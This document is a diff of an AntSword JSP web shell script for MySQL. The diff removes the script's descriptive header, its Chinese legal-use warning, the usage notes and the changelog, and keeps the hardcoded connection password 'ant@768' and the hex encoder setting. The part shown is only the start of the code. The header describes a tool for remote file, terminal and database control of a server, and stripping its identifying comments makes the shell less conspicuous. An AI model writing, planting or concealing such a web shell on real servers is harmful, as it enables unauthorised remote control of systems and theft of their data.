@@ -1,55 +1,9 @@
-<%--
-             _   ____                       _
-  __ _ _ __ | |_/ ___|_      _____  _ __ __| |
- / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
-| (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
- \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
-———————————————————————————————————————————————
-    AntSword JSP Custom Script for Mysql
-    警告：
-        此脚本仅供合法的渗透测试以及爱好者参考学习
-         请勿用于非法用途，否则将追究其相关责任！
-———————————————————————————————————————————————
 
-说明：
- 1. AntSword >= v1.1-dev
- 2. 创建 Shell 时选择 custom 模式连接
- 3. 数据库连接：
-    com.mysql.jdbc.Driver
-    jdbc:mysql://localhost/test?user=root&password=123456
-
-    注意：以上是两行
- 4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
-
-已知问题：
- 1. 文件管理遇到中文文件名显示的问题
-ChangeLog:
-  v1.4
-    1. 修正 windows 下基础路径获取盘符会出现小写的情况
-  v1.3
-   1. 修正上传文件超过1M时的bug
-   2. 修正weblogic war 包布署获取路径问题
-   3. 修正文件中文字符问题
-  Date: 2016/04/29 v1.2
-   1. 修正修改包含结束tag的文件会出错的 bug
-  Date: 2016/04/06 v1.1
-   1. 修正下载文件参数设置错误
-   2. 修正一些注释的细节
-  Date: 2016/03/26 v1
-   1. 文件系统 和 terminal 管理
-   2. mysql 数据库支持
-   3. 支持 base64 和 hex 编码
---%>
 <%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*" contentType="text/html;charset=UTF-8"%>
 <%!
-// ################################################
-    String Pwd = "ant@768";   //连接密码
-    // 数据编码 3 选 1
-    String encoder = "hex";       // default
-    // String encoder = "base64"; //base64
-    // String encoder = "hex";    //hex(推荐)
-    String cs = "UTF-8"; // 编码方式
-// ################################################
+    String Pwd = "ant@768";
+    String encoder = "hex"; 
+    String cs = "UTF-8"; 
 
     String EC(String s) throws Exception {
         if(encoder.equals("hex") || encoder == "hex") return s;
